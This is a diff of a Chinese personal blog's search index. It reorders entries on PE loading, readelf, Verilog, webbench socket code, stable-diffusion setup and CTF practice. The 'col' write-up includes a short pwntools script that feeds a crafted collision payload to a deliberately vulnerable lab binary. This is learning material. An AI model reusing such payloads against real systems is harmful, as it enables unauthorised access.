+<h2 id="尾声">尾声</h2>
+<p>这篇文章写道一半的时候重装电脑了,然后忘记备份这个博客的源码了.....</p>
+<p>最终博客是全都开发完成的状态,可惜文章烂尾了</p>
 ]]></content>
       <categories>
-        <category>开发</category>
-        <category>GamePlay</category>
+        <category>黑历史与垃圾</category>
       </categories>
   </entry>
   <entry>
@@ -1402,6 +1404,40 @@ Infrastructure)通用语言架构,包含CIL等组件的整个通用语言<strong
       <categories>
         <category>杂谈</category>
       </categories>
+  </entry>
+  <entry>
+    <title>程序:从静态文件到装载为进程</title>
+    <url>/pe-loader/</url>
+    <content><![CDATA[<h2 id="正文">正文</h2>
+<p>什么是进程？当我们提到进程的时候，其实就是这个进程所对应的主要程序，及其所需要的程序外部资源、代码等</p>
+<p>比如一个调用了MessageBoxW
+API的程序在运行时会向外部dll进行查找，进程也应当包含被查找的外部资源对象等</p>
+<p>我们都知道，每个进程都有一个属于自己的独立的4GB的虚拟空间；如果从0000
+0000开始计数的话，4GB对应为FFFF
+FFFF，但实际上这片空间并不是平权的，大致可以分为：</p>
+<p><img
+src="https://static.zhishibox.net/20210315/image_109593497.png" /></p>
+<p>如果只是死记硬背这些数值的话，倒也没什么意义</p>
+<p>这里记录一下困扰笔者的一点：</p>
+<p>空指针赋值区原则上来说只需要0000
+0000地址处为0就足够所有程序使用了；防止越界的禁入区原则上来说44kb也够用了；就算是为了安全考虑，64kb大小的NULLptr空间，未免也太过冗余了吧；经查，这与<strong>分配粒度</strong>，<strong>字节对齐</strong>等有关，网上大部分资料指向Window核心编程的相关章节；经查该章节及其前后部分并未说明<strong>分配粒度</strong>的定义，同时<strong>分配粒度</strong>一词并无维基百科词条，进而在看雪、52上搜索，找到一篇远古文章，原文链接如下</p>
+<p>https://web.archive.org/web/20110117113240/http://blog.ednchina.com/colinluan/238299/message.aspx#78067</p>
+<p>"若仅仅解释为<strong>对齐需要</strong>的话，64kb也未免有些太大了"；经查，这一操作是为了向后兼容，防止由于各种原因需要在用户模式区之前加入一小段机器码，因此<strong>缺省对齐值大于最小合法对齐值</strong></p>
+<p>需要特别提及的一点是，64kb禁入区在MMU内部映射表中，不指向任何实际的物理内存区块</p>
+<p>每个进程独立的虚拟空间，只有低2G区域，高2G区域的内核段是所有程序共用的，操作系统需要在这部分区域中加载各类dll以及其他外部资源</p>
+<p>所有的进程都是由其他进程创建的，第一个进程（PID==0）是由操作系统内核创建的</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>开发</category>
+        <category>编译原理</category>
+      </categories>
+      <tags>
+        <tag>编译</tag>
+        <tag>装载</tag>
+        <tag>进程</tag>
+        <tag>动态内存</tag>
+      </tags>
   </entry>
   <entry>
     <title>重写(override)和重载(overload),extern和virtual</title>
@@ -1440,40 +1476,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053625
       </tags>
   </entry>
   <entry>
-    <title>程序:从静态文件到装载为进程</title>
-    <url>/pe-loader/</url>
-    <content><![CDATA[<h2 id="正文">正文</h2>
-<p>什么是进程？当我们提到进程的时候，其实就是这个进程所对应的主要程序，及其所需要的程序外部资源、代码等</p>
-<p>比如一个调用了MessageBoxW
-API的程序在运行时会向外部dll进行查找，进程也应当包含被查找的外部资源对象等</p>
-<p>我们都知道，每个进程都有一个属于自己的独立的4GB的虚拟空间；如果从0000
-0000开始计数的话，4GB对应为FFFF
-FFFF，但实际上这片空间并不是平权的，大致可以分为：</p>
-<p><img
-src="https://static.zhishibox.net/20210315/image_109593497.png" /></p>
-<p>如果只是死记硬背这些数值的话，倒也没什么意义</p>
-<p>这里记录一下困扰笔者的一点：</p>
-<p>空指针赋值区原则上来说只需要0000
-0000地址处为0就足够所有程序使用了；防止越界的禁入区原则上来说44kb也够用了；就算是为了安全考虑，64kb大小的NULLptr空间，未免也太过冗余了吧；经查，这与<strong>分配粒度</strong>，<strong>字节对齐</strong>等有关，网上大部分资料指向Window核心编程的相关章节；经查该章节及其前后部分并未说明<strong>分配粒度</strong>的定义，同时<strong>分配粒度</strong>一词并无维基百科词条，进而在看雪、52上搜索，找到一篇远古文章，原文链接如下</p>
-<p>https://web.archive.org/web/20110117113240/http://blog.ednchina.com/colinluan/238299/message.aspx#78067</p>
-<p>"若仅仅解释为<strong>对齐需要</strong>的话，64kb也未免有些太大了"；经查，这一操作是为了向后兼容，防止由于各种原因需要在用户模式区之前加入一小段机器码，因此<strong>缺省对齐值大于最小合法对齐值</strong></p>
-<p>需要特别提及的一点是，64kb禁入区在MMU内部映射表中，不指向任何实际的物理内存区块</p>
-<p>每个进程独立的虚拟空间，只有低2G区域，高2G区域的内核段是所有程序共用的，操作系统需要在这部分区域中加载各类dll以及其他外部资源</p>
-<p>所有的进程都是由其他进程创建的，第一个进程（PID==0）是由操作系统内核创建的</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>开发</category>
-        <category>编译原理</category>
-      </categories>
-      <tags>
-        <tag>编译</tag>
-        <tag>装载</tag>
-        <tag>进程</tag>
-        <tag>动态内存</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PE loader如何判断PE文件确实是一个PE文件？</title>
     <url>/pe-loader-ru-he-pan-duan-pe-wen-jian-que-shi-shi-yi-ge-pe-wen-jian/</url>
     <content><![CDATA[<p>只会进行四步判定就默许为PE文件，如果这种默许出现了其他错误，会在遇到非法指令时掷错退出并认为这是一个编译等过程出现一定错误的PE文件（还是PE文件）</p>
@@ -1488,37 +1490,6 @@ src="https://static.zhishibox.net/20210315/image_109593497.png" /></p>
         <category>笔记</category>
         <category>存档</category>
       </categories>
-  </entry>
-  <entry>
-    <title>pwn1_sctf_2016 WP</title>
-    <url>/pwn1-sctf-2016-wp/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>IDA分析错了+一些暂时悬而未决的疑点,故作记录</p>
-<h2 id="正文">正文</h2>
-<p>核心利用点在replace</p>
-<p>这里我不赘述了,毕竟是老题,而且是简单题,wp思路可以看看其他师傅</p>
-<p>这里主要是讲两点</p>
-<p>一个是,貌似文件里面的所有STL函数的第一个参数都是这个</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050064.png" /></p>
-<p>然后进去函数后函数会自动覆盖掉arg[0],再把所有参数下移4个偏移</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050278.png" /></p>
-<p>再退出函数时,会把arg[0]再次设为这个值</p>
-<p>这里这两点让我很在意</p>
-<p>但是没有找到合适的说法,编译原理学的比较菜</p>
-<p>暂且悬置</p>
-]]></content>
-      <categories>
-        <category>信息安全</category>
-        <category>二进制</category>
-        <category>笔记</category>
-        <category>存档</category>
-      </categories>
-      <tags>
-        <tag>WP</tag>
-        <tag>悬而未决</tag>
-      </tags>
   </entry>
   <entry>
     <title>PE loader装载时做的部分工作、导入表、导出表</title>
@@ -1593,10 +1564,41 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056442
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>存档</category>
       </categories>
+  </entry>
+  <entry>
+    <title>pwn1_sctf_2016 WP</title>
+    <url>/pwn1-sctf-2016-wp/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>IDA分析错了+一些暂时悬而未决的疑点,故作记录</p>
+<h2 id="正文">正文</h2>
+<p>核心利用点在replace</p>
+<p>这里我不赘述了,毕竟是老题,而且是简单题,wp思路可以看看其他师傅</p>
+<p>这里主要是讲两点</p>
+<p>一个是,貌似文件里面的所有STL函数的第一个参数都是这个</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050064.png" /></p>
+<p>然后进去函数后函数会自动覆盖掉arg[0],再把所有参数下移4个偏移</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050278.png" /></p>
+<p>再退出函数时,会把arg[0]再次设为这个值</p>
+<p>这里这两点让我很在意</p>
+<p>但是没有找到合适的说法,编译原理学的比较菜</p>
+<p>暂且悬置</p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+        <category>笔记</category>
+        <category>二进制</category>
+        <category>存档</category>
+      </categories>
+      <tags>
+        <tag>WP</tag>
+        <tag>悬而未决</tag>
+      </tags>
   </entry>
   <entry>
     <title>pwnable靶场ak-WP （1）FD利用</title>
@@ -1619,8 +1621,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050137
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>存档</category>
       </categories>
   </entry>
@@ -1642,8 +1644,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053924
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>存档</category>
       </categories>
   </entry>
@@ -1656,8 +1658,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053924
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>存档</category>
       </categories>
   </entry>
@@ -1708,8 +1710,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049231
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>存档</category>
       </categories>
   </entry>
@@ -1783,8 +1785,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050301
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>存档</category>
       </categories>
   </entry>
@@ -1836,50 +1838,8 @@ project ,this time we try use C to pwn rather than pwntool</p>
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
-        <category>存档</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pwnable靶场ak-WP（2）col MD5碰撞</title>
-    <url>/pwnable-ba-chang-ak-wp-2-col-md5-peng-zhuang/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>这个题目之前第一次写的时候指针学的不扎实，有非常多的问题，这次打算不适用IDA的F5直接分析汇编</p>
-<p>得到了很多经验</p>
-<h2 id="正文">正文</h2>
-<p>连接，ls查看，发现关键文件col，下载回来本地，IDA分析</p>
-<p>关键函数.text:08048494 Check()</p>
-<p>关键参数重命名后如下</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181055772.png" /></p>
-<p>注意橙色箭头的ADD，正是这个操作导致IDA误报了数据类型为int，这让我在第一次做这个的时候非常麻烦，其实这里是直接对地址操作，滑套理念，把所有东西都看作是纯粹的DW数据，只是一个纯粹的数字罢了，这样思考就方便理解多了</p>
-<p>同时注意红色箭头的后续跟进操作</p>
-<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056535.png"  /></p>
-<p>xref找到hashcode</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056185.png" /></p>
-<p>这里是简单的sum碰撞</p>
-<p>几个容易混的要点，一个地址代表一个字节，一个地址是一个最小单位，一个字节是有操作意义的最小单位，32位总线每次传输一个双字（DWord，四字节），一个双字指针指向一个字节，但代表了四个字节全体</p>
-<p>另外一个很重要的是，大小端的字节序和栈增长方向这两个东西，前者是相对于元素内部的字节顺序，后者相对于元素本身的顺序，后者把元素看作了质点，前者研究系统内部，不能看作是质点</p>
-<h2 id="补充">补充</h2>
-<p>补一个argv的方向问题，本题当中挺重要的，这里讨论的前提是默认状态下32位Linux系统</p>
-<p>假设有一个程序main.elf，对他argv传参 \xc8\xce\xc5\x06 即：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./main.elf \xc8\xce\xc5\x06</span><br></pre></td></tr></table></figure>
-<p>那么谁先入栈argv?</p>
-<p>答案是最右侧的\x06，同时栈向下增长，最后最低位是\xc8</p>
-<p>用自然语言书写顺序就是06C5CEC8h</p>
-<p>所以可以确定，argv参数入栈和一般的函数参数入栈顺序一样，都是先push最右边的参数</p>
-<h2 id="wp脚本">WP脚本</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">a = p32(113626824)</span><br><span class="line">b = p32(113626828)</span><br><span class="line">payload = a*4 + b</span><br><span class="line">print (payload)</span><br><span class="line">p=process([&#x27;./col&#x27;,payload])</span><br><span class="line">print(p.recvall())</span><br></pre></td></tr></table></figure>
-<h2 id="补充2">补充2</h2>
-<p>recv系类函数返回值是str，需要加一句print</p>
-<p>C语言程序的argv参数是不支持<strong>标准输入流命令</strong>的，需要使用getopt</p>
-]]></content>
-      <categories>
-        <category>信息安全</category>
         <category>二进制</category>
-        <category>笔记</category>
         <category>存档</category>
       </categories>
   </entry>
@@ -1924,6 +1884,48 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056185
       </tags>
   </entry>
   <entry>
+    <title>pwnable靶场ak-WP（2）col MD5碰撞</title>
+    <url>/pwnable-ba-chang-ak-wp-2-col-md5-peng-zhuang/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>这个题目之前第一次写的时候指针学的不扎实，有非常多的问题，这次打算不适用IDA的F5直接分析汇编</p>
+<p>得到了很多经验</p>
+<h2 id="正文">正文</h2>
+<p>连接，ls查看，发现关键文件col，下载回来本地，IDA分析</p>
+<p>关键函数.text:08048494 Check()</p>
+<p>关键参数重命名后如下</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181055772.png" /></p>
+<p>注意橙色箭头的ADD，正是这个操作导致IDA误报了数据类型为int，这让我在第一次做这个的时候非常麻烦，其实这里是直接对地址操作，滑套理念，把所有东西都看作是纯粹的DW数据，只是一个纯粹的数字罢了，这样思考就方便理解多了</p>
+<p>同时注意红色箭头的后续跟进操作</p>
+<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056535.png"  /></p>
+<p>xref找到hashcode</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056185.png" /></p>
+<p>这里是简单的sum碰撞</p>
+<p>几个容易混的要点，一个地址代表一个字节，一个地址是一个最小单位，一个字节是有操作意义的最小单位，32位总线每次传输一个双字（DWord，四字节），一个双字指针指向一个字节，但代表了四个字节全体</p>
+<p>另外一个很重要的是，大小端的字节序和栈增长方向这两个东西，前者是相对于元素内部的字节顺序，后者相对于元素本身的顺序，后者把元素看作了质点，前者研究系统内部，不能看作是质点</p>
+<h2 id="补充">补充</h2>
+<p>补一个argv的方向问题，本题当中挺重要的，这里讨论的前提是默认状态下32位Linux系统</p>
+<p>假设有一个程序main.elf，对他argv传参 \xc8\xce\xc5\x06 即：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./main.elf \xc8\xce\xc5\x06</span><br></pre></td></tr></table></figure>
+<p>那么谁先入栈argv?</p>
+<p>答案是最右侧的\x06，同时栈向下增长，最后最低位是\xc8</p>
+<p>用自然语言书写顺序就是06C5CEC8h</p>
+<p>所以可以确定，argv参数入栈和一般的函数参数入栈顺序一样，都是先push最右边的参数</p>
+<h2 id="wp脚本">WP脚本</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">a = p32(113626824)</span><br><span class="line">b = p32(113626828)</span><br><span class="line">payload = a*4 + b</span><br><span class="line">print (payload)</span><br><span class="line">p=process([&#x27;./col&#x27;,payload])</span><br><span class="line">print(p.recvall())</span><br></pre></td></tr></table></figure>
+<h2 id="补充2">补充2</h2>
+<p>recv系类函数返回值是str，需要加一句print</p>
+<p>C语言程序的argv参数是不支持<strong>标准输入流命令</strong>的，需要使用getopt</p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+        <category>笔记</category>
+        <category>二进制</category>
+        <category>存档</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pwntools中symbols，plt，got这三个数组的区别</title>
     <url>/pwntools-zhong-symbols-plt-got-zhe-san-ge-shu-zu-de-qu-bie/</url>
     <content><![CDATA[<p>其实主要是回答symbols数组和plt，got数组的区别</p>
@@ -1933,8 +1935,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056185
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>存档</category>
       </categories>
       <tags>
@@ -1959,20 +1961,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056185
       </tags>
   </entry>
   <entry>
-    <title>readelf的一些用法</title>
-    <url>/readelf-de-yi-xie-yong-fa/</url>
-    <content><![CDATA[<p>-h 帮助列表</p>
-<p>-s 打印.symtab和dynsym 外部和内部符号表</p>
-<p>-S 打印sections</p>
-<p>-ctf 这个选项还没玩明白,貌似挺牛逼,用到了再说</p>
-<p>-a 打印所有</p>
-<p>其他的用的比较少了</p>
-]]></content>
-      <categories>
-        <category>黑历史与垃圾</category>
-      </categories>
-  </entry>
-  <entry>
     <title>python-exe逆向流程</title>
     <url>/python-exe-ni-xiang-liu-cheng/</url>
     <content><![CDATA[<p>主要记一个笔记</p>
@@ -1987,6 +1975,20 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056185
         <tag>python</tag>
         <tag>python字节码</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>readelf的一些用法</title>
+    <url>/readelf-de-yi-xie-yong-fa/</url>
+    <content><![CDATA[<p>-h 帮助列表</p>
+<p>-s 打印.symtab和dynsym 外部和内部符号表</p>
+<p>-S 打印sections</p>
+<p>-ctf 这个选项还没玩明白,貌似挺牛逼,用到了再说</p>
+<p>-a 打印所有</p>
+<p>其他的用的比较少了</p>
+]]></content>
+      <categories>
+        <category>黑历史与垃圾</category>
+      </categories>
   </entry>
   <entry>
     <title>Redmi 9 国行版线刷MIUI12.5欧版</title>
@@ -2141,6 +2143,28 @@ alt="7V784x.md.png" /></a></p>
       </categories>
   </entry>
   <entry>
+    <title>stable-diffusion 部署踩坑</title>
+    <url>/stable-diffusion-bu-shu-cai-keng/</url>
+    <content><![CDATA[<p>问题一 RuntimeError: Couldn't install open_clip.</p>
+<p>解决 https://github.com/CompVis/stable-diffusion/issues/661</p>
+<p>问题二 No matching distribution found for gradio==3.23</p>
+<p>https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/8896</p>
+<p>问题三 RuntimeError: self.size(-1) must be divisible by 4 to view
+Byte as Float (different element sizes), but got 16268507RuntimeError:
+self.size(-1) must be divisible by 4 to view Byte as Float (different
+element sizes), but got 16268507RuntimeError: self.size(-1) must be
+divisible by 4 to view Byte as Float (different element sizes), but got
+16268507</p>
+<p>https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/8653</p>
+]]></content>
+      <categories>
+        <category>未分类</category>
+      </categories>
+      <tags>
+        <tag>未分类</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>微电路组合电路元件笔记</title>
     <url>/sr-suo-cun-qi/</url>
     <content><![CDATA[<h2 id="选择器">选择器</h2>
@@ -2219,47 +2243,6 @@ system)</p>
       </categories>
   </entry>
   <entry>
-    <title>stable-diffusion 部署踩坑</title>
-    <url>/stable-diffusion-bu-shu-cai-keng/</url>
-    <content><![CDATA[<p>问题一 RuntimeError: Couldn't install open_clip.</p>
-<p>解决 https://github.com/CompVis/stable-diffusion/issues/661</p>
-<p>问题二 No matching distribution found for gradio==3.23</p>
-<p>https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/8896</p>
-<p>问题三 RuntimeError: self.size(-1) must be divisible by 4 to view
-Byte as Float (different element sizes), but got 16268507RuntimeError:
-self.size(-1) must be divisible by 4 to view Byte as Float (different
-element sizes), but got 16268507RuntimeError: self.size(-1) must be
-divisible by 4 to view Byte as Float (different element sizes), but got
-16268507</p>
-<p>https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/8653</p>
-]]></content>
-      <categories>
-        <category>未分类</category>
-      </categories>
-      <tags>
-        <tag>未分类</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Verilog的数据类型中x,y的含义</title>
-    <url>/verilog-de-shu-ju-lei-xing-zhong-xy-de-han-yi/</url>
-    <content><![CDATA[<p><位宽>‘<进制><数字></p>
-<p><strong>x值和z值：</strong>在数字电路中，x代表不定值，z代表高阻值。一个x可以定义十六进制的4位，八进制的3位，二进制的一位（十进制暂时未知）。z的表示方式同x相同，另外z亦可以用“？”来表示。（case块中用得较多）</p>
-<p>4'b10x0            //位宽为4的二进制数从低位数起第二位为不定值</p>
-<p>4'b101z            //位宽为4的二进制数从低位数起第一位为高阻值</p>
-<p>12'dz               //位宽为12的10进制数，其值为高阻值（形式一）</p>
-<p>12'd?               //位宽为12的10进制数，其值为高阻值（形式二）</p>
-<p>8'h4x               //位宽为8的十六进制数，其低4位为不定值</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172046844.png" /></p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>校内</category>
-        <category>计组</category>
-      </categories>
-  </entry>
-  <entry>
     <title>三种const</title>
     <url>/three-kind-of-const/</url>
     <content><![CDATA[<h1 id="前言">前言</h1>
@@ -2285,24 +2268,59 @@ const含义为返回值不可被变更,且返回值只能被赋值给同样被co
         <category>短笔记</category>
       </categories>
       <tags>
-        <tag>cpp</tag>
         <tag>悬而未决</tag>
+        <tag>cpp</tag>
         <tag>需要修改</tag>
       </tags>
   </entry>
   <entry>
-    <title>webbench源码分析与程序改进及SOCKS网络协议笔记 （3）main文件解析</title>
-    <url>/webbench-yuan-ma-fen-xi-yu-cheng-xu-gai-jin-ji-socks-wang-luo-xie-yi-bi-ji-3-main-wen-jian/</url>
-    <content><![CDATA[<p>通读了一遍 主要逻辑是</p>
-<p>通过分支选择来append字符串，然后发出去</p>
-<p>fork与sleep的配合精确控制child数量，同时保证只有一层child关系</p>
-<p>粗略看完一遍感觉封装度太高了，宏观层面看起来很简单</p>
-<p>拓展POST功能这茬子事先放一放，先更新pwnable靶场的通关WP</p>
+    <title>Verilog的数据类型中x,y的含义</title>
+    <url>/verilog-de-shu-ju-lei-xing-zhong-xy-de-han-yi/</url>
+    <content><![CDATA[<p><位宽>‘<进制><数字></p>
+<p><strong>x值和z值：</strong>在数字电路中，x代表不定值，z代表高阻值。一个x可以定义十六进制的4位，八进制的3位，二进制的一位（十进制暂时未知）。z的表示方式同x相同，另外z亦可以用“？”来表示。（case块中用得较多）</p>
+<p>4'b10x0            //位宽为4的二进制数从低位数起第二位为不定值</p>
+<p>4'b101z            //位宽为4的二进制数从低位数起第一位为高阻值</p>
+<p>12'dz               //位宽为12的10进制数，其值为高阻值（形式一）</p>
+<p>12'd?               //位宽为12的10进制数，其值为高阻值（形式二）</p>
+<p>8'h4x               //位宽为8的十六进制数，其低4位为不定值</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172046844.png" /></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>校内</category>
+        <category>计组</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>webbench源码分析与程序改进及SOCKS网络协议笔记 （2）什么是socks，Linux平台面向socks编程笔记</title>
+    <url>/webbench-yuan-ma-fen-xi-yu-cheng-xu-gai-jin-ji-socks-wang-luo-xie-yi-bi-ji-2-shi-me/</url>
+    <content><![CDATA[<p>在单端多进程，IP池有限等因素的加持下，出现了socks协议，本质上来说，假如目标IP为192.168.1.2，端口为88，则指针“192.168.1.2:88”所指向的目标，就是一个socks对象实例</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115498.png" /></p>
+<p>socks的本义其实是网络数据线末端的那个卡扣</p>
+<p>另外补一个数据边界的笔记</p>
+<p>SOCK_STREAM是无边界的，SOCK_DGRAM是有边界的</p>
+<p>这种边界并非体现在底层硬件的MTU大小和切片分发，分片传输机制，而是体现在通信双方应用层面，在这个问题上，我们要把硬件层看成透明的</p>
+<p>然后如何理解边界一词，也就是数据是连续的，接受和发送是异步的，读取和发送可以是断续的，可以在buf满时操作，也可以在未满时操作，双方的行动不需要统一，虽然内容可以是断续的，但连接是流状的，是连续存在的</p>
+<p>而有数据边界则恰恰相反，收发的连接双方在线程操作buf的次数和相对行为上必须同步，同时收发包的顺序无法做到相同</p>
+<h2 id="面向socks协议栈开发">面向socks协议栈开发</h2>
+<p>代码中出现了一堆底层类和结构体，正好学一下TCP协议，之前草草学过一点点，基本就只知道了个DHCP。。。</p>
+<p>sockaddr_in结构体</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sockaddr_in &#123;</span><br><span class="line">               sa_family_t    sin_family; /* address family: AF_INET */ 指明协议（实际上这个结构体是专门用于IPv4的）</span><br><span class="line">               in_port_t      sin_port;   /* port in network byte order */指明端口</span><br><span class="line">               struct in_addr sin_addr;   /* internet address */指明地址</span><br><span class="line"></span><br><span class="line">               //某些版本的源码中,此处另有八个字节的零位对齐</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           struct in_addr &#123;</span><br><span class="line">               uint32_t       s_addr;     /* address in network byte order */只能IPv4</span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>
+<p>文档如下</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115948.png" /></p>
+<p>hostent结构体</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct hostent &#123;</span><br><span class="line">char *h_name; //域名字符串</span><br><span class="line">char **h_aliases;  //别名字符串</span><br><span class="line">int h_addrtype;//IPv4</span><br><span class="line">int h_length;</span><br><span class="line">char **h_addr_list;</span><br><span class="line">// 网络字节序的IP地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>写完注释的fSocks函数如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fSocket(const char *host, int clientPort)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int sock;</span><br><span class="line">    unsigned long inaddr;//二进制形式地址</span><br><span class="line">    struct sockaddr_in ad;//存放地址</span><br><span class="line">    struct hostent *hp;</span><br><span class="line">    </span><br><span class="line">    memset(&amp;ad, 0, sizeof(ad)); //分配内存</span><br><span class="line">    ad.sin_family = AF_INET;  //IPv4</span><br><span class="line"></span><br><span class="line">    inaddr = inet_addr(host);//将地址字符串转二进制形式的地址</span><br><span class="line">    if (inaddr != INADDR_NONE)//INADDR_NONE报错,如果输入非法IP字符串255 IP,都会出现该报错</span><br><span class="line">        memcpy(&amp;ad.sin_addr, &amp;inaddr, sizeof(inaddr));</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        hp = gethostbyname(host);//接收到exception为INADDR_NONE的IP,尝试解析该IP</span><br><span class="line">        if (hp == NULL)//无法解析IP,证明IP错误</span><br><span class="line">            return -1;</span><br><span class="line">        memcpy(&amp;ad.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);//可以向DNS解析IP,IP正确</span><br><span class="line">    &#125;</span><br><span class="line">    ad.sin_port = htons(clientPort);//把int型转换为网络传输字节型</span><br><span class="line">    </span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, 0);//建立IPv4,流格式,TCP数据连接,获取连接FD</span><br><span class="line">    if (connect(sock, (struct sockaddr *)&amp;ad, sizeof(ad)) &lt; 0)//double check Link exist</span><br><span class="line">        return -1;</span><br><span class="line">    return sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之后就是主体部分了</p>
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>开发</category>
         <category>存档</category>
         <category>网络</category>
@@ -2338,8 +2356,8 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053483
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>开发</category>
         <category>存档</category>
         <category>网络</category>
@@ -2350,34 +2368,18 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053483
       </tags>
   </entry>
   <entry>
-    <title>webbench源码分析与程序改进及SOCKS网络协议笔记 （2）什么是socks，Linux平台面向socks编程笔记</title>
-    <url>/webbench-yuan-ma-fen-xi-yu-cheng-xu-gai-jin-ji-socks-wang-luo-xie-yi-bi-ji-2-shi-me/</url>
-    <content><![CDATA[<p>在单端多进程，IP池有限等因素的加持下，出现了socks协议，本质上来说，假如目标IP为192.168.1.2，端口为88，则指针“192.168.1.2:88”所指向的目标，就是一个socks对象实例</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115498.png" /></p>
-<p>socks的本义其实是网络数据线末端的那个卡扣</p>
-<p>另外补一个数据边界的笔记</p>
-<p>SOCK_STREAM是无边界的，SOCK_DGRAM是有边界的</p>
-<p>这种边界并非体现在底层硬件的MTU大小和切片分发，分片传输机制，而是体现在通信双方应用层面，在这个问题上，我们要把硬件层看成透明的</p>
-<p>然后如何理解边界一词，也就是数据是连续的，接受和发送是异步的，读取和发送可以是断续的，可以在buf满时操作，也可以在未满时操作，双方的行动不需要统一，虽然内容可以是断续的，但连接是流状的，是连续存在的</p>
